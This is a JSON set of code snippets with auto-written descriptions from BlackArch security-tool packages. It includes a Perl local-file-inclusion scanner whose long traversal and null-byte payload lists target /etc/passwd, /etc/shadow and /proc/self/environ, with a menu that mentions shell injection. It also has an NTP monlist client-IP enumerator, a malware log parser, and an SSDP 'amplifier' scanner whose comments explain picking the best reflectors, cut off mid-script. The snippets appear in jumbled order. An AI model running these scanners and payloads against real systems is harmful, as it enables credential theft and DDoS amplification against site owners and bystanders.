[
  {
    "owner": "blackarch",
    "repo": "blackarch",
    "content": "TITLE: Executing /etc/ LFI Scan Loop and Checking Results in Perl\nDESCRIPTION: This code iterates through each LFI payload (`$scan`) defined in the `@lfi` array. For each payload, it constructs the full URL by appending the payload to the base `$host` URL. It then creates an HTTP GET request using `HTTP::Request`, sends it using `LWP::UserAgent`, and checks the response. If the request is successful (`$response->is_success`) and the response content contains the string 'root:x:' (a common indicator of `/etc/passwd` content), it flags the payload as 'Vulnerability'; otherwise, it marks it as 'Not Found'. The result for each payload is printed to the console.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/lfi-scanner/lfi-scanner-ver4.0.pl.txt#_snippet_5\n\nLANGUAGE: perl\nCODE:\n```\nforeach $scan(@lfi){\n\n$url = $host.$scan;\n$request = HTTP::Request->new(GET=>$url);\n$useragent = LWP::UserAgent->new();\n\n$response = $useragent->request($request);\nif ($response->is_success && $response->content =~ /root:x:/) { $msg = Vulnerability;}\nelse { $msg = \"Not Found\";}\nprint \"$scan..........[$msg]\\n\";\n}\n```\n\n----------------------------------------\n\nTITLE: Scanning for /proc/self/environ Disclosure via Directory Traversal in Perl\nDESCRIPTION: This Perl snippet constructs various directory traversal payloads for accessing the \"/proc/self/environ\" file with and without null-byte terminators. It iterates over each payload, appends it to a target host URL, sends HTTP GET requests using the LWP::UserAgent and HTTP::Request modules, and analyzes the response for typical environment variable leakage indicators (such as presence of 'HTTP_ACCEPT' and 'HTTP_HOST'). It prints the outcome for each tested path. Dependencies include the LWP and HTTP modules, and the key parameter is the list of environment file traversal paths. The input is a list of payloads and a host string; outputs are printed vulnerability findings for each payload. The approach assumes the target server mirrors typical Unix filesystem layout and that null-byte injection may work depending on the parsing implementation.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/lfi-scanner/lfi-scanner-ver4.0.pl.txt#_snippet_8\n\nLANGUAGE: Perl\nCODE:\n```\n'../../../../../../../../../../../proc/self/environ',\n'../../../../../../../../../../../../proc/self/environ',\n'../../../../../../../../../../../../../proc/self/environ',\n'../../../../../../../../../../../../../../proc/self/environ',\n'../proc/self/environ%00',\n'../../proc/self/environ%00',\n'../../../proc/self/environ%00',\n'../../../../proc/self/environ%00',\n'../../../../../proc/self/environ%00',\n'../../../../../../proc/self/environ%00',\n'../../../../../../../proc/self/environ%00',\n'../../../../../../../../proc/self/environ%00',\n'../../../../../../../../../proc/self/environ%00',\n'../../../../../../../../../../proc/self/environ%00',\n'../../../../../../../../../../../proc/self/environ%00',\n'../../../../../../../../../../../../proc/self/environ%00',\n'../../../../../../../../../../../../../proc/self/environ%00',\n'../../../../../../../../../../../../../../proc/self/environ%00');\n```\n\nLANGUAGE: Perl\nCODE:\n```\nforeach $scan_env(@env){\n\n$url = $host.$scan_env;\n$request = HTTP::Request->new(GET=>$url);\n$useragent = LWP::UserAgent->new();\n\n$response = $useragent->request($request);\nif ($response->is_success && $response->content =~ /HTTP_ACCEPT/ && $response->content =~ /HTTP_HOST/) { $msg = Vulnerability;}\nelse { $msg = \"Not Found\";}\nprint \"$scan_env..........[$msg]\\n\";\n}\n```\n\n----------------------------------------\n\nTITLE: Defining /etc/ LFI Payloads Array in Perl\nDESCRIPTION: This snippet initializes a Perl array named `@lfi` containing a comprehensive list of potential LFI payloads specifically targeting files within the `/etc` directory. It includes variations using different levels of directory traversal (`../`), alternative traversal syntax (`....//`), and null byte injection (`%00`) to bypass potential filters. Targeted files include `passwd`, `shadow`, `group`, and security-related files.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/lfi-scanner/lfi-scanner-ver4.0.pl.txt#_snippet_4\n\nLANGUAGE: perl\nCODE:\n```\nprint \"\\n\\n\";\nprint \"\\t\\t*-*-*-*-*-* WORKING IN PROGRESS *-*-*-*-*-*\\n\";\nprint \"\\n\\n\";\n@lfi = ('../etc/passwd',\n'../../etc/passwd',\n'../../../etc/passwd',\n'../../../../etc/passwd',\n'../../../../../etc/passwd',\n'../../../../../../etc/passwd',\n'../../../../../../../etc/passwd',\n'../../../../../../../../etc/passwd',\n'../../../../../../../../../etc/passwd',\n'../../../../../../../../../../etc/passwd',\n'../../../../../../../../../../../etc/passwd',\n'../../../../../../../../../../../../etc/passwd',\n'../../../../../../../../../../../../../etc/passwd',\n'../../../../../../../../../../../../../../etc/passwd',\n'../../../../../../../../../../../../../../../../etc/passwd',\n'....//etc/passwd',\n'....//....//etc/passwd',\n'....//....//....//etc/passwd',\n'....//....//....//....//etc/passwd',\n'....//....//....//....//....//etc/passwd',\n'....//....//....//....//....//....//etc/passwd',\n'....//....//....//....//....//....//....//etc/passwd',\n'....//....//....//....//....//....//....//....//etc/passwd',\n'....//....//....//....//....//....//....//....//....//etc/passwd',\n'....//....//....//....//....//....//....//....//....//....//etc/passwd',\n'../../etc/passwd%00',\n'../../../etc/passwd%00',\n'../../../../etc/passwd%00',\n'../../../../../etc/passwd%00',\n'../../../../../../etc/passwd%00',\n'../../../../../../../etc/passwd%00',\n'../../../../../../../../etc/passwd%00',\n'../../../../../../../../../etc/passwd%00',\n'../../../../../../../../../../etc/passwd%00',\n'../../../../../../../../../../../etc/passwd%00',\n'../../../../../../../../../../../../etc/passwd%00',\n'../../../../../../../../../../../../../etc/passwd%00',\n'../../../../../../../../../../../../../../etc/passwd%00',\n'../../../../../../../../../../../../../../../../etc/passwd%00',\n'....//etc/passwd%00',\n'....//....//etc/passwd%00',\n'....//....//....//etc/passwd%00',\n'....//....//....//....//etc/passwd%00',\n'....//....//....//....//....//etc/passwd%00',\n'....//....//....//....//....//....//etc/passwd%00',\n'....//....//....//....//....//....//....//etc/passwd%00',\n'....//....//....//....//....//....//....//....//etc/passwd%00',\n'....//....//....//....//....//....//....//....//....//etc/passwd%00',\n'....//....//....//....//....//....//....//....//....//....//etc/passwd%00',\n'../etc/shadow',\n'../../etc/shadow',\n'../../../etc/shadow',\n'../../../../etc/shadow',\n'../../../../../etc/shadow',\n'../../../../../../etc/shadow',\n'../../../../../../../etc/shadow',\n'../../../../../../../../etc/shadow',\n'../../../../../../../../../etc/shadow',\n'../../../../../../../../../../etc/shadow',\n'../../../../../../../../../../../etc/shadow',\n'../../../../../../../../../../../../etc/shadow',\n'../../../../../../../../../../../../../etc/shadow',\n'../../../../../../../../../../../../../../etc/shadow',\n'../etc/shadow%00',\n'../../etc/shadow%00',\n'../../../etc/shadow%00',\n'../../../../etc/shadow%00',\n'../../../../../etc/shadow%00',\n'../../../../../../etc/shadow%00',\n'../../../../../../../etc/shadow%00',\n'../../../../../../../../etc/shadow%00',\n'../../../../../../../../../etc/shadow%00',\n'../../../../../../../../../../etc/shadow%00',\n'../../../../../../../../../../../etc/shadow%00',\n'../../../../../../../../../../../../etc/shadow%00',\n'../../../../../../../../../../../../../etc/shadow%00',\n'../../../../../../../../../../../../../../etc/shadow%00',\n'../etc/group',\n'../../etc/group',\n'../../../etc/group',\n'../../../../etc/group',\n'../../../../../etc/group',\n'../../../../../../etc/group',\n'../../../../../../../etc/group',\n'../../../../../../../../etc/group',\n'../../../../../../../../../etc/group',\n'../../../../../../../../../../etc/group',\n'../../../../../../../../../../../etc/group',\n'../../../../../../../../../../../../etc/group',\n'../../../../../../../../../../../../../etc/group',\n'../../../../../../../../../../../../../../etc/group',\n'../etc/group%00',\n'../../etc/group%00',\n'../../../etc/group%00',\n'../../../../etc/group%00',\n'../../../../../etc/group%00',\n'../../../../../../etc/group%00',\n'../../../../../../../etc/group%00',\n'../../../../../../../../etc/group%00',\n'../../../../../../../../../etc/group%00',\n'../../../../../../../../../../etc/group%00',\n'../../../../../../../../../../../etc/group%00',\n'../../../../../../../../../../../../etc/group%00',\n'../../../../../../../../../../../../../etc/group%00',\n'../../../../../../../../../../../../../../etc/group%00',\n'../etc/security/group',\n'../../etc/security/group',\n'../../../etc/security/group',\n'../../../../etc/security/group',\n'../../../../../etc/security/group',\n'../../../../../../etc/security/group',\n'../../../../../../../etc/security/group',\n'../../../../../../../../etc/security/group',\n'../../../../../../../../../etc/security/group',\n'../../../../../../../../../../etc/security/group',\n'../../../../../../../../../../../etc/security/group',\n'../etc/security/group%00',\n'../../etc/security/group%00',\n'../../../etc/security/group%00',\n'../../../../etc/security/group%00',\n'../../../../../etc/security/group%00',\n'../../../../../../etc/security/group%00',\n'../../../../../../../etc/security/group%00',\n'../../../../../../../../etc/security/group%00',\n'../../../../../../../../../etc/security/group%00',\n'../../../../../../../../../../etc/security/group%00',\n'../../../../../../../../../../../etc/security/group%00',\n'../etc/security/passwd',\n'../../etc/security/passwd',\n'../../../etc/security/passwd',\n'../../../../etc/security/passwd',\n'../../../../../etc/security/passwd',\n'../../../../../../etc/security/passwd',\n'../../../../../../../etc/security/passwd',\n'../../../../../../../../etc/security/passwd',\n'../../../../../../../../../etc/security/passwd',\n'../../../../../../../../../../etc/security/passwd',\n'../../../../../../../../../../../etc/security/passwd',\n'../../../../../../../../../../../../etc/security/passwd',\n'../../../../../../../../../../../../../etc/security/passwd',\n'../../../../../../../../../../../../../../etc/security/passwd',\n'../etc/security/passwd%00',\n'../../etc/security/passwd%00',\n'../../../etc/security/passwd%00',\n'../../../../etc/security/passwd%00',\n'../../../../../etc/security/passwd%00',\n'../../../../../../etc/security/passwd%00',\n'../../../../../../../etc/security/passwd%00',\n'../../../../../../../../etc/security/passwd%00',\n'../../../../../../../../../etc/security/passwd%00',\n'../../../../../../../../../../etc/security/passwd%00',\n'../../../../../../../../../../../etc/security/passwd%00',\n'../../../../../../../../../../../../etc/security/passwd%00',\n'../../../../../../../../../../../../../etc/security/passwd%00',\n'../../../../../../../../../../../../../../etc/security/passwd%00',\n'../etc/security/user',\n'../../etc/security/user',\n'../../../etc/security/user',\n'../../../../etc/security/user',\n'../../../../../etc/security/user',\n'../../../../../../etc/security/user',\n'../../../../../../../etc/security/user',\n'../../../../../../../../etc/security/user',\n'../../../../../../../../../etc/security/user',\n'../../../../../../../../../../etc/security/user',\n'../../../../../../../../../../../etc/security/user',\n'../../../../../../../../../../../../etc/security/user',\n'../../../../../../../../../../../../../etc/security/user',\n'../etc/security/user%00',\n'../../etc/security/user%00',\n'../../../etc/security/user%00',\n'../../../../etc/security/user%00',\n'../../../../../etc/security/user%00',\n'../../../../../../etc/security/user%00',\n'../../../../../../../etc/security/user%00',\n'../../../../../../../../etc/security/user%00',\n'../../../../../../../../../etc/security/user%00',\n'../../../../../../../../../../etc/security/user%00',\n'../../../../../../../../../../../etc/security/user%00',\n'../../../../../../../../../../../../etc/security/user%00',\n'../../../../../../../../../../../../../etc/security/user%00');\n```\n\n----------------------------------------\n\nTITLE: Fetching Monlist Data from NTP Server in Python\nDESCRIPTION: This function sends multiple NTP monlist requests to a specified NTP server using UDP and collects the responses. It utilizes a non-blocking socket with a timeout and retries mechanism (`TRIES` attempts with `TIMEOUT` seconds each). It parses the received packets using `parse_monlist_packet` and aggregates the unique IP addresses found in the responses. It depends on `socket`, `select`, `get_payload`, and `parse_monlist_packet`. A nested helper `send_payload` handles sending the request.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/ntp-ip-enum/ntp_ip_enum.txt#_snippet_4\n\nLANGUAGE: python\nCODE:\n```\ndef fetch(ntp_server, timeout=5):\n    def send_payload(sock, target):\n        data = get_payload()\n        bytes_sent = sock.sendto(data, (target, 123))\n        if bytes_sent != len(data) and DEBUG:\n            print \"Failed to send payload\"\n\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind(('0.0.0.0', 0))\n\n    send_payload(sock, ntp_server)\n\n    results = set()\n    count = 0\n    while True:\n        rlist, wlist, xlist = select.select([sock], [], [], TIMEOUT)\n        if sock in rlist:\n            data, addr = sock.recvfrom(1024)\n            ret = parse_monlist_packet(data)\n            if ret['error']:\n                if DEBUG: print \"Error parsing packet[%s]\" % ret['error']\n            else:\n                results.update([x[0] for x in ret['records']])\n        else:\n            count += 1\n            if count >= TRIES:\n                break\n            send_payload(sock, ntp_server)\n\n    return list(results)\n```\n\n----------------------------------------\n\nTITLE: Processing BitDefender Log File (`process_log_file`) in Perl\nDESCRIPTION: This subroutine processes the BitDefender log file (default `bdscan.log`). It opens the log file, iterates through each line, and uses regular expressions to extract information. It captures the total number of scanned files and identifies lines indicating infected files. For each infected file, it extracts the filename, status, and malware name (`vx_name`). It calculates the MD5 hash of the file using the `md5sum` subroutine, creates a directory named after the malware (`$arch/$vx_name`), and copies the infected file into this directory, renaming it to `<md5_hash>.<original_extension>`. These file operations (mkdir, cp) are skipped if the `$report_only` flag is set. It also maintains a count of each malware type in the `%cnt` hash.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/bdlogparser/bdLogParser.txt#_snippet_2\n\nLANGUAGE: perl\nCODE:\n```\nsub process_log_file {\nopen BDLOG, 'bdscan.log' or warn \"unable to open file: $!\";\nforeach $line (<BDLOG>) { \n\tif ($line =~ m/Files:\\s{1,2}(\\d+)/) { $stats_sfiles = $1; }  \n\t\tif ($line =~ m/infected/) { \n\t\t\t($fileName, $status, $vx_name) = split(' ', $line);\n\t\t\t($fileName, $gbg) = split(/=>/, $fileName) if ($fileName =~ m/=>/);\n    \t\t\t@VX = $vx_name;\n       \t\t\tforeach $X (@VX) { $cnt{$X}++; }\n      \t\t\t($file, $ext) = split(/\\./, $fileName);\n       \t\t\t$md5 = md5sum($fileName);\n\t\t\tsystem(\"mkdir -p $arch/$vx_name\") unless $report_only;\n\t\t\tsystem(\"cp $fileName $arch/$vx_name/$md5.$ext\") unless $report_only;\n\t\t}\n\t}\n   }\n   close BDLOG;\n```\n\n----------------------------------------\n\nTITLE: Generating Malware Statistics Report (`run_report`) in Perl\nDESCRIPTION: This subroutine generates a text report summarizing the malware found. It opens the specified report file (default `bdParserReport.txt`) for writing. It prints a header, the total number of files scanned (`$stats_sfiles` captured in `process_log_file`), and then iterates through the malware types stored as keys in the `%cnt` hash. The malware types are sorted in descending order of frequency using the `by_vx_count` sort subroutine. For each type, it prints the name and its count. Finally, it prints a confirmation message to standard output indicating the report file generation and closes the report file.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/bdlogparser/bdLogParser.txt#_snippet_4\n\nLANGUAGE: perl\nCODE:\n```\nsub run_report { \nopen (REPORT, '>bdParserReport.txt') or warn \"unable to open file: $!\";\n        print REPORT \"\\n\\n=Category Statistics=\\n\\n\";\n\tprint REPORT \"\\tFiles Scanned: $stats_sfiles\\n\";\n\tforeach $X (sort by_vx_count keys %cnt) { \n\t\t\tprint REPORT \"\\t$X: $cnt{$X} \\n\";\n\t}\n}\n\nprint \"\\nReport file generated: $report_file\\n\" if $enable_report;\nclose REPORT;\n```\n\n----------------------------------------\n\nTITLE: Main Script Execution for NTP Monlist Query in Python\nDESCRIPTION: This is the main execution block of the script. It checks for command-line arguments (target NTP server IPs), prints usage instructions if none are provided, iterates through the targets calling the `fetch` function for each, aggregates the unique IP addresses into a set, sorts the results numerically, and then either prints the results in Maltego XML format (if `OUTPUT_FORMAT` is 'maltego') or appends them to a file named 'NTP.txt' along with target host information and a count.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/ntp-ip-enum/ntp_ip_enum.txt#_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nif __name__ == '__main__':\n    if len(sys.argv) > 1:\n        targets = sys.argv[1:]\n    else:\n        print \"Usage: %s target ntp servers\\n\\nThis script will return a unique set of IP's obtained from the list of ntp servers via the monlist command\" % sys.argv[0]\n        sys.exit(-1)\n\n    results = set()\n    for target in targets:\n        results.update(fetch(target))\n    results = sorted(results, key=str_ip_to_int)\n\n    if str(OUTPUT_FORMAT).lower() == 'maltego':\n        print_maltego(results)\n    else:\n\tFILE = open(filename,\"a\")\n\tFILE.writelines(\"-------------------------------NTP List------------------------------\")\n\tFILE.writelines(\"\\n\")\n\tFILE.writelines(\"Target host: \")\n\tFILE.writelines(targets)\n\tFILE.writelines(\"\\n\")\n\t#print \"\\n\".join(results)\n\tFILE.writelines(\"\\n\".join(results))\n\tFILE.writelines(\"\\n\")\n\tFILE.writelines(\"Number of results %s\" % len(results))\n\tprint \"Completed.  Check NTP.txt\"\n```\n\n----------------------------------------\n\nTITLE: Parsing NTP Monlist Response Packet in Python\nDESCRIPTION: This function parses the raw data received from an NTP server in response to a monlist request. It unpacks the header fields, checks flags and request codes to validate the packet, and extracts client IP addresses and ports from the data records. It returns a dictionary containing parsing status, flags, potential errors, and a list of (IP, port) tuples.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/ntp-ip-enum/ntp_ip_enum.txt#_snippet_3\n\nLANGUAGE: python\nCODE:\n```\ndef parse_monlist_packet(data):\n    result = dict(response=False, more=False, error=None, records=[])\n\n    if len(data) < 8:\n        result['error'] = 'NO_HEADER'\n        return result\n\n    ntp_flags, ntp_auth, ntp_vers, ntp_req_code, num_items, item_size  = unpack('!BBBBHH', data[0:8])\n    data = data[8:]\n\n    result['response'] = ntp_flags & (1 << 7) > 0\n    result['more'] = ntp_flags & (1 << 6) > 0\n\n    if not result['response']: #Return if its a request\n        result['error'] = \"REQUEST_PACKET\"\n    elif ntp_req_code == 42: #Check if its a monlist packet\n        if DEBUG: print \"item_size[%s] \\tnum_items[%s] \\tlen(data)[%s]\" % (item_size, num_items, len(data))\n\n        if item_size != 32:\n            result['error'] = \"WRONG_ITEM_SIZE\"\n        elif num_items < 1:\n            result['error'] = \"WRONG_ITEM_COUNT\"\n        elif len(data) < num_items*item_size:\n            result['error'] = \"SHORT_PACKET\"\n        else:\n            for offset in range(0, num_items*item_size, item_size):\n                parts = unpack('!IIIIIIII', data[offset:offset+item_size])\n                ip = int_ip_to_str(parts[4])\n                port = parts[7]\n                result['records'].append((ip, port))\n    else:\n        result['error'] = \"WRONG_REQUEST_CODE\"\n\n    return result\n```\n\n----------------------------------------\n\nTITLE: Generating Maltego XML Output from IP List in Python\nDESCRIPTION: This function takes a list of IP address strings and generates an XML output formatted for Maltego. It uses `xml.dom.minidom` to create the XML structure, defining each IP address as a Maltego 'IPAddress' entity. The function prints the generated XML to standard output, removing the XML declaration header for compatibility with Maltego.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/ntp-ip-enum/ntp_ip_enum.txt#_snippet_5\n\nLANGUAGE: python\nCODE:\n```\ndef print_maltego(results):\n    from xml.dom.minidom import Document\n    doc = Document()\n    mm = doc.createElement('MaltegoMessage')\n    doc.appendChild(mm)\n    mtrm = doc.createElement('MaltegoTransformResponseMessage')\n    mm.appendChild(mtrm)\n    entities = doc.createElement('Entities')\n    mtrm.appendChild(entities)\n\n    for result in results:\n        entity = doc.createElement('Entity')\n        entity.setAttribute('Type', 'IPAddress')\n\n        value = doc.createElement('Value')\n        value_node = doc.createTextNode(result)\n\n        value.appendChild(value_node)\n        entity.appendChild(value)\n        entities.appendChild(entity)\n\n    output = doc.toxml()\n    print output[output.index(\"<Maltego\"):] # Hack to rip out <? xml ?> so that maltego can function\n```\n\n----------------------------------------\n\nTITLE: Implementing Menu Navigation for LFI Scan Options in Perl\nDESCRIPTION: This snippet implements a menu system for the LFI scanner. It presents two options: scanning `/etc/` files (ID 1) or scanning `/proc/self/environ` (ID 2). It reads user input from standard input (`<>`), checks if the input matches '1' or '2' using regular expressions, and uses `goto` statements to jump to the respective code sections (`lfi` or `env`). If the input is invalid, it prints an error and loops back to the menu (`goto menu`).\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/lfi-scanner/lfi-scanner-ver4.0.pl.txt#_snippet_2\n\nLANGUAGE: perl\nCODE:\n```\nmenu:;\nprint \"\\tMenu:\\n\";\nprint \"\\t ID[1]=>Passwd,Log\";\nprint \"\\t[Scan Files Of /etc/ Directory]\\n\";\nprint \"\\t ID[2]=>Environ\";\nprint \"\\t\\t[Scan Environ File For Inject Shell By U-Agent]\\n\";\nprint\"\\n\";\nprint \"\\t\\t Select ID For Start Scanner :\";\n$menu = <>;\nif ($menu =~ /1/){\n\tgoto lfi;\n\t}\n\tif ($menu =~ /2/){\n\t\tgoto env;\n\t}\n\telse {\n\t\tprint\"\\n\\n\";\n\t\tprint \"\\t\\tUnknow Command\\n\";\n\t\tgoto menu;\n\t};\n```\n\n----------------------------------------\n\nTITLE: Defining /proc/self/environ LFI Payloads Array in Perl\nDESCRIPTION: This snippet initializes a Perl array named `@env` containing LFI payloads designed to access the `/proc/self/environ` file. This file often contains environment variables, which might include sensitive information or could be leveraged for further attacks (like injecting code via the User-Agent header if PHP is used). The payloads use various levels of directory traversal (`../`). A loop to test these payloads is implied but not included in the provided text.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/lfi-scanner/lfi-scanner-ver4.0.pl.txt#_snippet_7\n\nLANGUAGE: perl\nCODE:\n```\nprint \"\\n\\n\";\nprint \"\\t\\t*-*-*-*-*-* WORKING IN PROGRESS *-*-*-*-*-*\\n\";\nprint \"\\n\\n\";\n\n@env = ('../proc/self/environ',\n'../../proc/self/environ',\n'../../../proc/self/environ',\n'../../../../proc/self/environ',\n'../../../../../proc/self/environ',\n'../../../../../../proc/self/environ',\n'../../../../../../../proc/self/environ',\n'../../../../../../../../proc/self/environ',\n'../../../../../../../../../proc/self/environ',\n'../../../../../../../../../../proc/self/environ',\n```\n\n----------------------------------------\n\nTITLE: Setting Up Target URL for /etc/ LFI Scan in Perl\nDESCRIPTION: This code block marks the beginning of the LFI scanning section for `/etc/` files (labeled `lfi:`). It prints a section-specific welcome message, prompts the user to enter the target URL (including the vulnerable parameter), reads the input from STDIN, removes the trailing newline using `chomp`, and ensures the URL starts with 'http://' by prepending it if necessary.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/lfi-scanner/lfi-scanner-ver4.0.pl.txt#_snippet_3\n\nLANGUAGE: perl\nCODE:\n```\nlfi:;\n    print \"\\n\\n\";\n    print \"\\t\\t\\tWelcome To /etc/ Section With New Method\\n\\n\";\n    print \"\\t Insert Target (ex: http://www.site.com/index.php?page=)\\n\";\n    print \"\\t Target :\";\n    $host=<STDIN>;\n    chomp($host);\n    if($host !~ /http:\\/\\//) { $host = \"http://$host\"; };\n```\n\n----------------------------------------\n\nTITLE: Generating NTP Monlist Request Payload in Python\nDESCRIPTION: This function returns a hardcoded byte string representing the payload for an NTP version 2 'monlist' request. This specific payload is used to query an NTP server for a list of its most recently seen clients.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/ntp-ip-enum/ntp_ip_enum.txt#_snippet_2\n\nLANGUAGE: python\nCODE:\n```\ndef get_payload():\n    return \"\"\"\\x17\\x00\\x02\\x2a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\"\"\n```\n\n----------------------------------------\n\nTITLE: Converting String IP to Integer Representation in Python\nDESCRIPTION: This function takes a standard dotted-decimal string representation of an IP address and converts it into its integer representation using the socket library. It uses inet_aton to convert the string to a packed binary format and then unpacks it as a network byte order long integer.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/ntp-ip-enum/ntp_ip_enum.txt#_snippet_1\n\nLANGUAGE: python\nCODE:\n```\ndef str_ip_to_int(ip):\n    return unpack('!L',socket.inet_aton(ip))\n```\n\n----------------------------------------\n\nTITLE: Converting Integer IP to String Representation in Python\nDESCRIPTION: This function takes an integer representation of an IP address and converts it into the standard dotted-decimal string format using the socket library. It packs the integer into a network byte order long integer and then uses inet_ntoa.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/ntp-ip-enum/ntp_ip_enum.txt#_snippet_0\n\nLANGUAGE: python\nCODE:\n```\ndef int_ip_to_str(ip_num):\n    return socket.inet_ntoa(pack('!L', ip_num))\n```\n\n----------------------------------------\n\nTITLE: Setting Up Target URL for Environ LFI Scan in Perl\nDESCRIPTION: This code block marks the beginning of the LFI scanning section for `/proc/self/environ` (labeled `env:`). It prints a section-specific welcome message, prompts the user to enter the target URL (including the vulnerable parameter) again, reads the input from STDIN, removes the trailing newline using `chomp`, and ensures the URL starts with 'http://' by prepending it if necessary. Note that this duplicates the target input logic from the `/etc/` scan section.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/lfi-scanner/lfi-scanner-ver4.0.pl.txt#_snippet_6\n\nLANGUAGE: perl\nCODE:\n```\nenv:;\n    print \"\\n\\n\";\n    print \"\\t\\t\\tWelcom To Environ Section\\n\\n\";\n    print \"\\t Insert Target (ex: http://www.site.com/index.php?page=)\\n\";\n    print \"\\t Target :\";\n    $host=<STDIN>;\n    chomp($host);\n    if($host !~ /http:\\/\\//) { $host = \"http://$host\"; };\n```\n\n----------------------------------------\n\nTITLE: Calculating MD5 Hash (`md5sum`) in Perl\nDESCRIPTION: This subroutine calculates the MD5 hash of a given file. It takes the file path as an argument (`$file`). It attempts to open the file, creates a `Digest::MD5` context, adds the file content to the context using `addfile`, and then computes the hexadecimal digest. It uses an `eval` block for basic error handling; if an error occurs (e.g., file not found), it prints the error message (`$@`) and returns an empty string. Otherwise, it returns the calculated MD5 hash as a hexadecimal string.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/bdlogparser/bdLogParser.txt#_snippet_5\n\nLANGUAGE: perl\nCODE:\n```\nsub md5sum{\n  my $file = shift;\n  my $digest = \"\";\n  eval{\n    open(FILE, $file) or die \"Can't find file $file\\n\";\n    my $ctx = Digest::MD5->new;\n    $ctx->addfile(*FILE);\n    $digest = $ctx->hexdigest;\n    close(FILE);\n  };\n  \n  if($@){ print $@; return \"\"; }\n          return $digest;\n}\n```\n\n----------------------------------------\n\nTITLE: Main Execution Logic in Perl\nDESCRIPTION: This is the main control flow of the script after initialization and option parsing. It conditionally calls the `process_log_file` subroutine if the `$process_log_file` flag (set by the `-p` option) is true. Similarly, it calls the `run_report` subroutine if the `$enable_report` flag (set by the `-r` option) is true.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/bdlogparser/bdLogParser.txt#_snippet_1\n\nLANGUAGE: perl\nCODE:\n```\nprocess_log_file() if $process_log_file;\nrun_report() if $enable_report;\n```\n\n----------------------------------------\n\nTITLE: Scanning and Listening for SSDP Responses with Scapy - Python\nDESCRIPTION: This Python 2 script scans a specified range of IP addresses for SSDP (UPnP) responses by sending 'M-SEARCH' requests and listening for UDP replies using raw sockets. It uses Scapy for packet crafting and sending and relies on sockets for low-level network receiving. Required dependencies include Scapy, Python 2, and network access with raw socket permissions. Main inputs are start and end IP addresses and an output file path; outputs are lines in the output file detailing responding hosts and UDP packet sizes. The script runs scanning and listening in parallel using threads, and is intended to run on dedicated servers only (not VPS).\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/ssdp-scanner/ssdp-amplifier.txt#_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n#!/usr/bin/python2\n\nfrom scapy.all import *\nfrom struct import *\nimport sys\nimport socket\nimport time\nimport threading\nimport random\nfrom threading import Thread\n\n\n    ########################\n    #Remember the SSDP scanner keeps all packets received, so make sure you sort them example command:\n\n    #Notice: THIS HAS ONLY BEEN TESTED ON A DEDICATED SERVER VPS's MAY NOT WORK.\n\n\n    #Here is a small list of commands that can help you sort your list:\n\n    #This command removes the length of the responce and puts the output in line-by-line list format:\n    #cat scannedlist.txt | awk '{print $1}' | sort -u | sort -R > output.txt\n\n    #This next command sorts for all packets over 300 byte reply size and saves the output to a list:\n    #cat scannedlist.txt | awk '$2 > 300' | awk 'print $1' | sort -u | sort -R > output.txt\n\n    #This next command sorts for all reflectors that replyed with 10 or more packets (this is my favorite):\n    #cat scannedlist.txt | sort | uniq -c | awk '$2 > 10' | awk 'print $2' | sort -u | sort -R > output.txt\n    ########################\n\nif len (sys.argv) != 4:\n    print \"Usage: ./\" + sys.argv[0] + \" [ip-start] [ip-end] [output]\\n      Notice: This script requires Scapy (available with apt-get or yum installs\\n    Notice: THIS HAS ONLY BEEN TESTED ON A DEDICATED SERVER VPS's MAY NOT WORK.\\n   V.1.0 Made by XXX\"\n    sys.exit()\n\nmydestport = random.randint(400,65535)\nconf.verb = 0\ndata = \"M-SEARCH * HTTP/1.1\\r\\nHOST: 239.255.255.250:1900\\r\\nMAN: \\\"ssdp:discover\\\"\\r\\nMX: 2\\r\\nST: ssdp:all\\r\\n\\r\\n\"\nrecv = 0\n\ndef eth_addr (a):\n    b = \"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\" % (ord(a[0]) , ord(a[1]) , ord(a[2]), ord(a[3]), ord(a[4]) , ord(a[5]))\n    return b\n\nsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nsock.connect(('google.com', 80))\nmyhost = sock.getsockname()[0]\nsock.close()\n\ndef ipRange(start_ip, end_ip):\n    